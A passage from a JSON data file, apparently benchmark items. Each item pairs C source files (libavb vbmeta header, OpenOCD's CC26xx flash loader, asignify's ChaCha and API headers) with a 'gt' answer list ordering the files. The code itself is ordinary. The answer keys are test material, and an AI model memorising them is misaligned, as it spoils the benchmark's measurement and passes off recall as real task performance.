uint64_t public_key_metadata_size;\n\n\n  uint64_t descriptors_offset;\n\n  uint64_t descriptors_size;\n\n\n  uint64_t rollback_index;\n\n\n  uint32_t flags;\n\n\n  uint8_t reserved0[4];\n\n\n  uint8_t release_string[AVB_RELEASE_STRING_SIZE];\n\n\n  uint8_t reserved[80];\n} AVB_ATTR_PACKED AvbVBMetaImageHeader;\n\n\nvoid avb_vbmeta_image_header_to_host_byte_order(const AvbVBMetaImageHeader* src,\n                                                AvbVBMetaImageHeader* dest);\n\n\ntypedef enum {\n  AVB_VBMETA_VERIFY_RESULT_OK,\n  AVB_VBMETA_VERIFY_RESULT_OK_NOT_SIGNED,\n  AVB_VBMETA_VERIFY_RESULT_INVALID_VBMETA_HEADER,\n  AVB_VBMETA_VERIFY_RESULT_UNSUPPORTED_VERSION,\n  AVB_VBMETA_VERIFY_RESULT_HASH_MISMATCH,\n  AVB_VBMETA_VERIFY_RESULT_SIGNATURE_MISMATCH,\n} AvbVBMetaVerifyResult;\n\n\nconst char* avb_vbmeta_verify_result_to_string(AvbVBMetaVerifyResult result);\n\n\nAvbVBMetaVerifyResult avb_vbmeta_image_verify(\n    const uint8_t* data,\n    size_t length,\n    const uint8_t** out_public_key_data,\n    size_t* out_public_key_length) AVB_ATTR_WARN_UNUSED_RESULT;\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_crypto.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_vbmeta_image.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/avb/libavb/avb_vbmeta_image.c'"
        ]
    },
    {
        "files": [
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flash.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.c'"
        ],
        "content": "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.h'\n:\n\n\n\n#ifndef OPENOCD_LOADERS_FLASH_CC26XX_FLASHLOADER_H\n#define OPENOCD_LOADERS_FLASH_CC26XX_FLASHLOADER_H\n\n#include <stdint.h>\n#include <stdbool.h>\n#include <string.h>\n#include \"flash.h\"\n\n\n#define NELEMS(a) (sizeof(a) / sizeof(a[0]))\n\nstruct __attribute__((__packed__)) flash_params {\n\tuint32_t dest;\n\tuint32_t len;\n\tuint32_t cmd;\n\tuint32_t full;\n\tuint32_t buf_addr;\n};\n\ntypedef enum {\n\tCMD_NO_ACTION = 0,\n\tCMD_ERASE_ALL = 1,\n\tCMD_PROGRAM = 2,\n\tCMD_ERASE_AND_PROGRAM = 3,\n\tCMD_ERASE_AND_PROGRAM_WITH_RETAIN = 4,\n\n\tCMD_ERASE_SECTORS = 5\n} flash_commands_t;\n\ntypedef enum {\n\tBUFFER_EMPTY = 0x0,\n\tBUFFER_FULL = 0xFFFFFFFF\n} flash_handshake_t;\n\n#define STATUS_FLASHLOADER_STATUS_M 0x0000FFFF\n#define STATUS_FLASHLOADER_STATUS_S 0\n#define STATUS_ROM_CODE_M           0x00FF0000\n#define STATUS_ROM_CODE_S           16\n#define STATUS_EXT_INFO_M           0xFF000000\n#define STATUS_EXT_INFO_S           24\n\ntypedef enum {\n\tSTATUS_OK = 0,\n\tSTATUS_FAILED_ERASE_ALL = 0x101,\n\tSTATUS_FAILED_SECTOR_ERASE = 0x102,\n\tSTATUS_FAILED_PROGRAM = 0x103,\n\tSTATUS_FAILED_INVALID_ARGUMENTS = 0x104,\n\tSTATUS_FAILED_UNKNOWN_COMMAND = 0x105,\n} flash_status_t;\n\n\n#define BUFFER_LEN FLASH_ERASE_SIZE\n\n\nextern uint32_t flashloader_init(struct flash_params *params, uint8_t *buf1,\n\tuint8_t *buf2);\n\n\nextern uint32_t flashloader_erase_and_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count);\n\n\nextern uint32_t flashloader_program_with_retain(uint8_t *src, uint32_t address,\n\tuint32_t byte_count);\n\n\nextern uint32_t flashloader_erase_all(void);\n\n\nextern uint32_t flashloader_erase_sectors(uint32_t start_addr,\n\tuint32_t byte_count);\n\n\nextern uint32_t flashloader_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count);\n\n\nstatic inline uint32_t flashloader_address_to_sector(uint32_t address)\n\t{ return (address / FLASH_ERASE_SIZE); };\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/cc26xx/flash.h'\n:\n\n\n\n#ifndef OPENOCD_LOADERS_FLASH_CC26XX_FLASH_H\n#define OPENOCD_LOADERS_FLASH_CC26XX_FLASH_H\n\n#ifdef __cplusplus\nextern \"C\"\n{\n#endif\n\n#include <stdint.h>\n#include <stdbool.h>\n#include \"hw_regs.h\"\n\n\n#define FLASHMEM_BASE 0\n\n\n#define ROM_API_TABLE       ((uint32_t *) 0x10000180)\n#define ROM_VERSION         (ROM_API_TABLE[0])\n#define ROM_API_FLASH_TABLE ((uint32_t *) (ROM_API_TABLE[10]))\n\n#if defined(DEVICE_CC26X2)\n\n\n\n#define FLASH_ERASE_SIZE       8192\n\n#define FLASH_MAX_SECTOR_COUNT 132\n#define FLASH_SECTOR_BASE_M    0xFFFFE000\n\n\n#define CCFG_O_BL_CONFIG 0x00001FD8\n\n#elif defined(DEVICE_CC26X0)\n\n\n\n#define FLASH_ERASE_SIZE       4096\n\n#define FLASH_MAX_SECTOR_COUNT 32\n#define FLASH_SECTOR_BASE_M    0xFFFFF000\n\n\n#define CCFG_O_BL_CONFIG 0x00000FD8\n\n#else\n#error No DEVICE defined.\n#endif\n\n\n#define FAPI_STATUS_SUCCESS   0x00000000\n#define FAPI_STATUS_FSM_BUSY  0x00000001\n#define FAPI_STATUS_FSM_READY 0x00000002\n#define FAPI_STATUS_INCORRECT_DATABUFFER_LENGTH \\\n\t\t\t\t\t\t\t  0x00000003\n#define FAPI_STATUS_FSM_ERROR 0x00000004\n\n\n#define ADDR_OFFSET (0x1F800000 - FLASHMEM_BASE)\n\n\n#define FCFG1_OFFSET 0x1000\n\n\n#define FLASH_MODULE_CLK_FREQ 48\n\n\ntypedef enum {\n\tFAPI_PROGRAM_DATA    = 0x0002,\n\tFAPI_ERASE_SECTOR    = 0x0006,\n\tFAPI_ERASE_BANK      = 0x0008,\n\tFAPI_VALIDATE_SECTOR = 0x000E,\n\tFAPI_CLEAR_STATUS    = 0x0010,\n\tFAPI_PROGRAM_RESUME  = 0x0014,\n\tFAPI_ERASE_RESUME    = 0x0016,\n\tFAPI_CLEAR_MORE      = 0x0018,\n\tFAPI_PROGRAM_SECTOR  = 0x0020,\n\tFAPI_ERASE_OTP       = 0x0030\n} flash_state_command_t;\n\n\n#define FSM_REG_WRT_ENABLE  5\n#define FSM_REG_WRT_DISABLE 2\n\n\n#define FBFALLBACK_SLEEP      0\n#define FBFALLBACK_DEEP_STDBY 1\n#define FBFALLBACK_ACTIVE     3\n\n\n#define FLASH_BAGP 0x14\n#define FLASH_PAGP 0x14\n\n\n#define FW_WRT_TRIMMED 0x00000001\n\n\ntypedef volatile uint8_t fwp_write_byte;\n#define FWPWRITE_BYTE_ADDRESS \\\n\t((fwp_write_byte *)((FLASH_BASE + FLASH_O_FWPWRITE0)))\n\n\n#define FLASH_CMD_EXEC 0x15\n\n\nstatic inline uint32_t flash_sector_size_get(void)\n{\n\tuint32_t sector_size_in_kbyte;\n\n\tsector_size_in_kbyte = (HWREG(FLASH_BASE + FLASH_O_FCFG_B0_SSIZE0) &\n\t\tFLASH_FCFG_B0_SSIZE0_B0_SECT_SIZE_M) >>\n\t\tFLASH_FCFG_B0_SSIZE0_B0_SECT_SIZE_S;\n\n\n\treturn sector_size_in_kbyte * 1024;\n}\n\n\nstatic inline uint32_t flash_size_get(void)\n{\n\tuint32_t num_of_sectors;\n\n\n\tnum_of_sectors = (HWREG(FLASH_BASE + FLASH_O_FLASH_SIZE) &\n\t\t\t\t\t\tFLASH_FLASH_SIZE_SECTORS_M) >>\n\t\t\t\t\t\tFLASH_FLASH_SIZE_SECTORS_S;\n\n\n\treturn num_of_sectors * flash_sector_size_get();\n}\n\n\nstatic inline uint32_t flash_check_fsm_for_error(void)\n{\n\tif (HWREG(FLASH_BASE + FLASH_O_FMSTAT) & FLASH_FMSTAT_CSTAT)\n\t\treturn FAPI_STATUS_FSM_ERROR;\n\telse\n\t\treturn FAPI_STATUS_SUCCESS;\n}\n\n\nstatic inline uint32_t flash_check_fsm_for_ready(void)\n{\n\tif (HWREG(FLASH_BASE + FLASH_O_STAT) & FLASH_STAT_BUSY)\n\t\treturn FAPI_STATUS_FSM_BUSY;\n\telse\n\t\treturn FAPI_STATUS_FSM_READY;\n}\n\n\nextern uint32_t flash_sector_erase(uint32_t sector_address);\n\n\nextern uint32_t flash_bank_erase(bool force_precondition);\n\n\nextern uint32_t flash_program(uint8_t *data_buffer, uint32_t address,\n\tuint32_t count);\n\n\nextern void flash_disable_sectors_for_write(void);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif\n\n'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.c'\n:\n\n\n\n#include <stdint.h>\n#include <stdbool.h>\n#include \"flashloader.h\"\n#include \"flash.h\"\n\n\nstatic bool g_is_erased[FLASH_MAX_SECTOR_COUNT];\n\nextern uint8_t g_retain_buf[];\n\nuint32_t flashloader_init(struct flash_params *params, uint8_t *buf1,\n\tuint8_t *buf2)\n{\n\n\tmemset((void *)params, 0, 2 * sizeof(struct flash_params));\n\tparams[0].buf_addr = (uint32_t)buf1;\n\tparams[1].buf_addr = (uint32_t)buf2;\n\n\n\tmemset(g_is_erased, false, sizeof(g_is_erased));\n\n\treturn STATUS_OK;\n}\n\nuint32_t flashloader_erase_and_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count)\n{\n\tif (byte_count > BUFFER_LEN)\n\t\treturn STATUS_FAILED_INVALID_ARGUMENTS;\n\n\n\tuint32_t status = flashloader_erase_sectors(address, byte_count);\n\n\tif (status != STATUS_OK)\n\t\treturn status;\n\n\n\tstatus = flashloader_program(src, address, byte_count);\n\n\treturn status;\n}\n\nuint32_t flashloader_program_with_retain(uint8_t *src, uint32_t address,\n\tuint32_t byte_count)\n{\n#if (BUFFER_LEN > FLASH_ERASE_SIZE)\n#error Buffer size cannot be larger than the flash sector size!\n#endif\n\n\tuint32_t first_sector_idx;\n\tuint32_t last_sector_idx;\n\tuint32_t status = STATUS_OK;\n\tuint32_t i;\n\n\tfirst_sector_idx = flashloader_address_to_sector(address);\n\tlast_sector_idx = flashloader_address_to_sector(address + byte_count - 1);\n\n\n\tmemset(g_is_erased, false, sizeof(g_is_erased));\n\n\tuint32_t sec_offset = address % FLASH_ERASE_SIZE;\n\tuint32_t curr_count;\n\tuint32_t src_offset = 0;\n\n\tfor (i = first_sector_idx; i <= last_sector_idx; i++) {\n\n\n\t\tcurr_count = byte_count;\n\t\tif ((address + byte_count) > ((i+1) * FLASH_ERASE_SIZE))\n\t\t\tcurr_count -= (address + byte_count) % FLASH_ERASE_SIZE;\n\n\n\t\tmemcpy(g_retain_buf, (void *)(i * FLASH_ERASE_SIZE), FLASH_ERASE_SIZE);\n\n\n\t\tmemcpy(&g_retain_buf[sec_offset], &src[src_offset], curr_count);\n\n\n\t\tstatus = flashloader_erase_and_program(g_retain_buf,\n\t\t\t\t\t(i * FLASH_ERASE_SIZE), FLASH_ERASE_SIZE);\n\t\tif (status != STATUS_OK)\n\t\t\treturn status;\n\n\t\taddress += curr_count;\n\t\tsec_offset = address % FLASH_ERASE_SIZE;\n\t\tbyte_count -= curr_count;\n\t\tsrc_offset += curr_count;\n\t}\n\n\treturn status;\n}\n\nuint32_t flashloader_erase_all(void)\n{\n\tif (flash_bank_erase(true) != FAPI_STATUS_SUCCESS)\n\t\treturn STATUS_FAILED_ERASE_ALL;\n\n\tmemset(g_is_erased, true, sizeof(g_is_erased));\n\n\treturn STATUS_OK;\n}\n\nuint32_t flashloader_erase_sectors(uint32_t address, uint32_t byte_count)\n{\n\tuint32_t first_sector_idx;\n\tuint32_t last_sector_idx;\n\tuint32_t status;\n\tuint32_t idx;\n\n\n\tfirst_sector_idx = flashloader_address_to_sector(address);\n\tlast_sector_idx = flashloader_address_to_sector(address + byte_count - 1);\n\n\n\tfor (idx = first_sector_idx; idx <= last_sector_idx; idx++) {\n\n\n\t\tif (g_is_erased[idx] == false) {\n\t\t\tstatus = flash_sector_erase(idx * FLASH_ERASE_SIZE);\n\t\t\tif (status != FAPI_STATUS_SUCCESS) {\n\t\t\t\tstatus = (STATUS_FAILED_SECTOR_ERASE |\n\t\t\t\t\t\t((idx << STATUS_EXT_INFO_S) & STATUS_EXT_INFO_M) |\n\t\t\t\t\t\t((status << STATUS_ROM_CODE_S) & STATUS_ROM_CODE_M));\n\t\t\t\treturn status;\n\t\t\t}\n\t\t\tg_is_erased[idx] = true;\n\t\t}\n\t}\n\n\treturn STATUS_OK;\n}\n\nuint32_t flashloader_program(uint8_t *src, uint32_t address,\n\tuint32_t byte_count)\n{\n\tuint32_t status = flash_program(src, address, byte_count);\n\tif (status != FAPI_STATUS_SUCCESS) {\n\t\tstatus = (STATUS_FAILED_PROGRAM |\n\t\t\t\t\t((status << STATUS_ROM_CODE_S) & STATUS_ROM_CODE_M));\n\t}\n\n\treturn STATUS_OK;\n}\n",
        "gt": [
            "'OpenOCD/contrib/loaders/flash/cc26xx/flash.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.h'",
            "'OpenOCD/contrib/loaders/flash/cc26xx/flashloader.c'"
        ]
    },
    {
        "files": [
            "'asignify/include/asignify.h'",
            "'asignify/libasignify/chacha.c'",
            "'asignify/libasignify/asignify_internal.h'"
        ],
        "content": "'asignify/include/asignify.h'\n:\n\n#ifndef libasignify_H\n#define libasignify_H\n\n#include <stdint.h>\n#include <stdbool.h>\n#include <stddef.h>\n\n#define PBKDF_MINROUNDS 10000\n\n#if defined(__cplusplus)\nextern \"C\" {\n#endif\n\n\nstruct asignify_verify_ctx;\nstruct asignify_sign_ctx;\nstruct asignify_encrypt_ctx;\ntypedef struct asignify_verify_ctx asignify_verify_t;\ntypedef struct asignify_sign_ctx asignify_sign_t;\ntypedef struct asignify_encrypt_ctx asignify_encrypt_t;\n\ntypedef int (*asignify_password_cb)(char *buf, size_t len, void *d);\n\n\nenum asignify_digest_type {\n\tASIGNIFY_DIGEST_SHA256 = 0,\n\tASIGNIFY_DIGEST_SHA512,\n\tASIGNIFY_DIGEST_BLAKE2,\n\tASIGNIFY_DIGEST_SIZE,\n\tASIGNIFY_DIGEST_MAX\n};\n\n\nenum asignify_encrypt_type {\n\tASIGNIFY_ENCRYPT_SAFE = 0,\n\tASIGNIFY_ENCRYPT_FAST\n};\n\n\nasignify_verify_t* asignify_verify_init(void);\n\n\nbool asignify_verify_load_pubkey(asignify_verify_t *ctx, const char *pubf);\n\n\nbool asignify_verify_load_signature(asignify_verify_t *ctx, const char *sigf);\n\n\nbool asignify_verify_file(asignify_verify_t *ctx, const char *checkf);\n\n\nconst char* asignify_verify_get_error(asignify_verify_t *ctx);\n\n\nvoid asignify_verify_free(asignify_verify_t *ctx);\n\n\nasignify_sign_t* asignify_sign_init(void);\n\n\nbool asignify_sign_load_privkey(asignify_sign_t *ctx, const char *privf,\n\tasignify_password_cb password_cb, void *d);\n\n\nbool asignify_sign_add_file(asignify_sign_t *ctx, const char *f,\n\tenum asignify_digest_type dt);\n\n\nbool asignify_sign_write_signature(asignify_sign_t *ctx, const char *sigf);\n\n\nconst char* asignify_sign_get_error(asignify_sign_t *ctx);\n\n\nvoid asignify_sign_free(asignify_sign_t *ctx);\n\n\nbool asignify_generate(const char *privkf, const char *pubkf,\n\t\tunsigned int version, unsigned int rounds,\n\t\tasignify_password_cb password_cb, void *d);\n\n\nbool asignify_generate_pubkey(const char *privkf, const char *pubkf,\n\t\tasignify_password_cb password_cb, void *d);\n\n\nvoid explicit_memzero(void * const pnt, const size_t len);\n\n\nunsigned int asignify_digest_len(enum asignify_digest_type type);\n\n\nconst char * asignify_digest_name(enum asignify_digest_type type);\n\n\nunsigned char* asignify_digest_fd(enum asignify_digest_type type, int fd);\n\n\nenum asignify_digest_type asignify_digest_from_str(const char *data,\n\tssize_t dlen);\n\n\nbool asignify_privkey_from_ssh(const char *sshkf, const char *privkf,\n\t\tunsigned int version, unsigned int rounds,\n\t\tasignify_password_cb password_cb, void *d);\n\n\nasignify_encrypt_t* asignify_encrypt_init(void);\n\n\nbool asignify_encrypt_load_pubkey(asignify_encrypt_t *ctx, const char *pubf);\n\n\nbool asignify_encrypt_load_privkey(asignify_encrypt_t *ctx, const char *privf,\n\tasignify_password_cb password_cb, void *d);\n\n\nbool\nasignify_encrypt_crypt_file(asignify_encrypt_t *ctx, unsigned int version,\n\tconst char *inf, const char *outf, enum asignify_encrypt_type type);\n\n\nbool\nasignify_encrypt_decrypt_file(asignify_encrypt_t *ctx, const char *inf,\n\tconst char *outf);\n\nconst char* asignify_encrypt_get_error(asignify_encrypt_t *ctx);\n\n\nvoid asignify_encrypt_free(asignify_encrypt_t *ctx);\n\n#if defined(__cplusplus)\n}\n#endif\n\n#endif\n\n'asignify/libasignify/chacha.c'\n:\n\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n#include \"chacha.h\"\n#include \"asignify_internal.h\"\n\nenum chacha_constants {\n\tCHACHA_BLOCKBYTES = 64,\n};\n\nCHACHA_ALIGN( 64 ) typedef struct chacha_state_internal_t {\n\tunsigned char s[48];\n\tsize_t rounds;\n\tsize_t leftover;\n\tunsigned char buffer[CHACHA_BLOCKBYTES];\n} chacha_state_internal;\n\ntypedef uint32_t chacha_int32;\n\n\nstatic chacha_int32\nU8TO32(const unsigned char *p) {\n\treturn\n\t(((chacha_int32)(p[0])      ) |\n\t (((chacha_int32)p[1]) <<  8) |\n\t (((chacha_int32)p[2]) << 16) |\n\t (((chacha_int32)p[3]) << 24));\n}\n\n\nstatic void\nU32TO8(unsigned char *p, chacha_int32 v) {\n\tp[0] = (v      ) & 0xff;\n\tp[1] = (v >>  8) & 0xff;\n\tp[2] = (v >> 16) & 0xff;\n\tp[3] = (v >> 24) & 0xff;\n}\n\n\nstatic chacha_int32\nROTL32(chacha_int32 x, int k) {\n\treturn ((x << k) | (x >> (32 - k))) & 0xffffffff;\n}\n\n\nstatic const chacha_int32 chacha_constants[4] = {\n\t0x61707865, 0x3320646e, 0x79622d32, 0x6b206574\n};\n\nstatic void\nchacha_blocks(chacha_state_internal *state, const unsigned char *in,\n\tunsigned char *out, size_t bytes)\n{\n\tCHACHA_ALIGN( 64 ) chacha_int32 x[16], j[12];\n\tchacha_int32 t;\n\tunsigned char *ctarget = out, tmp[64];\n\tsize_t i, r;\n\n\tif (!bytes) return;\n\n\tj[0] = U8TO32(state->s + 0);\n\tj[1] = U8TO32(state->s + 4);\n\tj[2] = U8TO32(state->s + 8);\n\tj[3] = U8TO32(state->s + 12);\n\tj[4] = U8TO32(state->s + 16);\n\tj[5] = U8TO32(state->s + 20);\n\tj[6] = U8TO32(state->s + 24);\n\tj[7] = U8TO32(state->s + 28);\n\tj[8] = U8TO32(state->s + 32);\n\tj[9] = U8TO32(state->s + 36);\n\tj[10] = U8TO32(state->s + 40);\n\tj[11] = U8TO32(state->s + 44);\n\n\tr = state->rounds;\n\n\tfor (;;) {\n\t\tif (bytes < 64) {\n\t\t\tif (in) {\n\t\t\t\tfor (i = 0; i < bytes; i++) tmp[i] = in[i];\n\t\t\t\tin = tmp;\n\t\t\t}\n\t\t\tctarget = out;\n\t\t\tout = tmp;\n\t\t}\n\n\t\tx[0] = chacha_constants[0];\n\t\tx[1] = chacha_constants[1];\n\t\tx[2] = chacha_constants[2];\n\t\tx[3] = chacha_constants[3];\n\t\tx[4] = j[0];\n\t\tx[5] = j[1];\n\t\tx[6] = j[2];\n\t\tx[7] = j[3];\n\t\tx[8] = j[4];\n\t\tx[9] = j[5];\n\t\tx[10] = j[6];\n\t\tx[11] = j[7];\n\t\tx[12] = j[8];\n\t\tx[13] = j[9];\n\t\tx[14] = j[10];\n\t\tx[15] = j[11];\n\n\t\t#define quarter(a,b,c,d) \\\n\t\t\ta += b; t = d^a; d = ROTL32(t,16); \\\n\t\t\tc += d; t = b^c; b = ROTL32(t,12); \\\n\t\t\ta += b; t = d^a; d = ROTL32(t, 8); \\\n\t\t\tc += d; t = b^c; b = ROTL32(t, 7);\n\n\t\t#define doubleround() \\\n\t\t\tquarter( x[0], x[4], x[8],x[12]) \\\n\t\t\tquarter( x[1], x[5], x[9],x[13]) \\\n\t\t\tquarter( x[2], x[6],x[10],x[14]) \\\n\t\t\tquarter( x[3], x[7],x[11],x[15]) \\\n\t\t\tquarter( x[0], x[5],x[10],x[15]) \\\n\t\t\tquarter( x[1], x[6],x[11],x[12]) \\\n\t\t\tquarter( x[2], x[7], x[8],x[13]) \\\n\t\t\tquarter( x[3], x[4], x[9],x[14])\n\n\t\ti = r;\n\t\tdo {\n\t\t\tdoubleround()\n\t\t\ti -= 2;\n\t\t} while (i);\n\n\t\tx[0] += chacha_constants[0];\n\t\tx[1] += chacha_constants[1];\n\t\tx[2] += chacha_constants[2];\n\t\tx[3] += chacha_constants[3];\n\t\tx[4] += j[0];\n\t\tx[5] += j[1];\n\t\tx[6] += j[2];\n\t\tx[7] += j[3];\n\t\tx[8] += j[4];\n\t\tx[9] += j[5];\n\t\tx[10] += j[6];\n\t\tx[11] += j[7];\n\t\tx[12] += j[8];\n\t\tx[13] += j[9];\n\t\tx[14] += j[10];\n\t\tx[15] += j[11];\n\n\t\tif (in) {\n\t\t\tU32TO8(out +  0,  x[0] ^ U8TO32(in +  0));\n\t\t\tU32TO8(out +  4,  x[1] ^ U8TO32(in +  4));\n\t\t\tU32TO8(out +  8,  x[2] ^ U8TO32(in +  8));\n\t\t\tU32TO8(out + 12,  x[3] ^ U8TO32(in + 12));\n\t\t\tU32TO8(out + 16,  x[4] ^ U8TO32(in + 16));\n\t\t\tU32TO8(out + 20,  x[5] ^ U8TO32(in + 20));\n\t\t\tU32TO8(out + 24,  x[6] ^ U8TO32(in + 24));\n\t\t\tU32TO8(out + 28,  x[7] ^ U8TO32(in + 28));\n\t\t\tU32TO8(out + 32,  x[8] ^ U8TO32(in + 32));\n\t\t\tU32TO8(out + 36,  x[9] ^ U8TO32(in + 36));\n\t\t\tU32TO8(out + 40, x[10] ^ U8TO32(in + 40));\n\t\t\tU32TO8(out + 44, x[11] ^ U8TO32(in + 44));\n\t\t\tU32TO8(out + 48, x[12] ^ U8TO32(in + 48));\n\t\t\tU32TO8(out + 52, x[13] ^ U8TO32(in + 52));\n\t\t\tU32TO8(out + 56, x[14] ^ U8TO32(in + 56));\n\t\t\tU32TO8(out + 60, x[15] ^ U8TO32(in + 60));\n\t\t\tin += 64;\n\t\t} else {\n\t\t\tU32TO8(out +  0,  x[0]);\n\t\t\tU32TO8(out +  4,  x[1]);\n\t\t\tU32TO8(out +  8,  x[2]);\n\t\t\tU32TO8(out + 12,  x[3]);\n\t\t\tU32TO8(out + 16,  x[4]);\n\t\t\tU32TO8(out + 20,  x[5]);\n\t\t\tU32TO8(out + 24,  x[6]);\n\t\t\tU32TO8(out + 28,  x[7]);\n\t\t\tU32TO8(out + 32,  x[8]);\n\t\t\tU32TO8(out + 36,  x[9]);\n\t\t\tU32TO8(out + 40, x[10]);\n\t\t\tU32TO8(out + 44, x[11]);\n\t\t\tU32TO8(out + 48, x[12]);\n\t\t\tU32TO8(out + 52, x[13]);\n\t\t\tU32TO8(out + 56, x[14]);\n\t\t\tU32TO8(out + 60, x[15]);\n\t\t}\n\n\n\t\tj[8]++;\n\t\tif (!j[8])\n\t\t\tj[9]++;\n\n\t\tif (bytes <= 64) {\n\t\t\tif (bytes < 64) for (i = 0; i < bytes; i++) ctarget[i] = out[i];\n\n\n\t\t\tU32TO8(state->s + 32, j[8]);\n\t\t\tU32TO8(state->s + 36, j[9]);\n\t\t\tgoto cleanup;\n\t\t}\n\t\tbytes -= 64;\n\t\tout += 64;\n\t}\n\ncleanup:\n\texplicit_memzero(j, sizeof(j));\n}\n\n\nstatic int\nchacha_is_aligned(const void *p) {\n\treturn ((size_t)p & (sizeof(size_t) - 1)) == 0;\n}\n\n\nvoid\nchacha_init(chacha_state *S, const chacha_key *key, const chacha_iv *iv, size_t rounds)\n{\n\tchacha_state_internal *state = (chacha_state_internal *)S;\n\tmemcpy(state->s + 0, key, 32);\n\tmemset(state->s + 32, 0, 8);\n\tmemcpy(state->s + 40, iv, 8);\n\tstate->rounds = rounds;\n\tstate->leftover = 0;\n}\n\n\nstatic void\nchacha_consume(chacha_state_internal *state, const unsigned char *in, unsigned char *out, size_t inlen)\n{\n\tunsigned char buffer[16 * CHACHA_BLOCKBYTES];\n\tint in_aligned, out_aligned;\n\n\n\tif (!inlen)\n\t\treturn;\n\n\n\tin_aligned = chacha_is_aligned(in);\n\tout_aligned = chacha_is_aligned(out);\n\tif (in_aligned && out_aligned) {\n\t\tchacha_blocks(state, in, out, inlen);\n\t\treturn;\n\t}\n\n\n\twhile (inlen) {\n\t\tconst size_t bytes = (inlen > sizeof(buffer)) ? sizeof(buffer) : inlen;\n\t\tconst unsigned char *src = in;\n\t\tunsigned char *dst = (out_aligned) ? out : buffer;\n\t\tif (!in_aligned) {\n\t\t\tmemcpy(buffer, in, bytes);\n\t\t\tsrc = buffer;\n\t\t}\n\t\tchacha_blocks(state, src, dst, bytes);\n\t\tif (!out_aligned)\n\t\t\tmemcpy(out, buffer, bytes);\n\t\tif (in) in += bytes;\n\t\tout += bytes;\n\t\tinlen -= bytes;\n\t}\n}\n\n\n\nsize_t\nchacha_update(chacha_state *S, const unsigned char *in, unsigned char *out, size_t inlen)\n{\n\tchacha_state_internal *state = (chacha_state_internal *)S;\n\tunsigned char *out_start = out;\n\tsize_t bytes;\n\n\n\tif ((state->leftover + inlen) >= CHACHA_BLOCKBYTES) {\n\n\t\tif (state->leftover) {\n\t\t\tbytes = (CHACHA_BLOCKBYTES - state->leftover);\n\t\t\tif (in) {\n\t\t\t\tmemcpy(state->buffer + state->leftover, in, bytes);\n\t\t\t\tin += bytes;\n\t\t\t}\n\t\t\tchacha_consume(state, (in) ? state->buffer : NULL, out, CHACHA_BLOCKBYTES);\n\t\t\tinlen -= bytes;\n\t\t\tout += CHACHA_BLOCKBYTES;\n\t\t\tstate->leftover = 0;\n\t\t}\n\n\n\t\tbytes = (inlen & ~(CHACHA_BLOCKBYTES - 1));\n\t\tif (bytes) {\n\t\t\tchacha_consume(state, in, out, bytes);\n\t\t\tinlen -= bytes;\n\t\t\tif (in) in += bytes;\n\t\t\tout += bytes;\n\t\t}\n\t}\n\n\n\tif (inlen) {\n\t\tif (in) memcpy(state->buffer + state->leftover, in, inlen);\n\t\telse memset(state->buffer + state->leftover, 0, inlen);\n\t\tstate->leftover += inlen;\n\t}\n\n\treturn out - out_start;\n}\n\n\nsize_t\nchacha_final(chacha_state *S, unsigned char *out) {\n\tchacha_state_internal *state = (chacha_state_internal *)S;\n\tsize_t ret;\n\n\tif (state->leftover) {\n\t\tif (chacha_is_aligned(out)) {\n\t\t\tchacha_blocks(state, state->buffer, out, state->leftover);\n\t\t} else {\n\t\t\tchacha_blocks(state, state->buffer, state->buffer, state->leftover);\n\t\t\tmemcpy(out, state->buffer, state->leftover);\n\t\t}\n\t}\n\n\tret = state->leftover;\n\texplicit_memzero(S, sizeof(chacha_state));\n\n\treturn ret;\n}\n\n'asignify/libasignify/asignify_internal.h'\n:\n#ifndef ASIGNIFY_INTERNAL_H_\n#define ASIGNIFY_INTERNAL_H_\n\n#include <sys/types.h>\n#include <stdint.h>\n#include <stdbool.h>\n#include <stdio.h>\n#include <fcntl.h>\n\n#include \"asignify.h\"\n\n#define OBSD_COMMENTHDR \"untrusted comment: \"\n#define PRIVKEY_MAGIC \"asignify-private-key\"\n#define KEY_ID_LEN 8\n#define SALT_LEN 16\n#define PBKDF_ALG \"pbkdf2-blake2\"\n\n#if defined(__GNUC__)  && __GNUC__ >= 4\n#define STRUCT_OFFSET(struct_type, member)\t\t\t\t\t\t\\\n      ((long) offsetof(struct_type, member))\n#else\n#define STRUCT_OFFSET(struct_type, member)\t\t\t\t\t\t\\\n      ((long)((unsigned char*) &((struct_type*) 0)->member))\n#endif\n#define STRUCT_MEMBER_PTR(member_type, struct_p, struct_offset)   \\\n    ((member_type*)((void *)((unsigned char*)(struct_p) + (long)(struct_offset))))\n\n#ifndef nitems\n#define\tnitems(x)\t(sizeof((x)) / sizeof((x)[0]))\n#endif\n\nstruct asignify_public_data {\n\tunsigned char *data;\n\tsize_t data_len;\n\tunsigned char *id;\n\tsize_t id_len;\n\tunsigned char *aux;\n\tsize_t aux_len;\n\tunsigned int version;\n};\n\nstruct asignify_private_data {\n\tunsigned char *data;\n\tsize_t data_len;\n\tunsigned char *id;\n\tsize_t id_len;\n\tunsigned int version;\n};\n\nstruct asignify_private_key {\n\tunsigned int version;\n\tchar *pbkdf_alg;\n\tunsigned int rounds;\n\tunsigned char *salt;\n\tunsigned char *checksum;\n\tunsigned char *id;\n\tunsigned char *encrypted_blob;\n};\n\nstruct asignify_file_digest {\n\tenum asignify_digest_type digest_type;\n\tunsigned char *digest;\n\tstruct asignify_file_digest *next;\n};\n\nstruct asignify_file {\n\tchar *fname;\n\tstruct asignify_file_digest *digests;\n\tsize_t size;\n};\n\nvoid randombytes(unsigned char *buf, uint64_t len);\n\nint pkcs5_pbkdf2(const char *pass, size_t pass_len, const uint8_t *salt,\n    size_t salt_len, uint8_t *key, size_t key_len, unsigned int rounds);\n\nFILE * 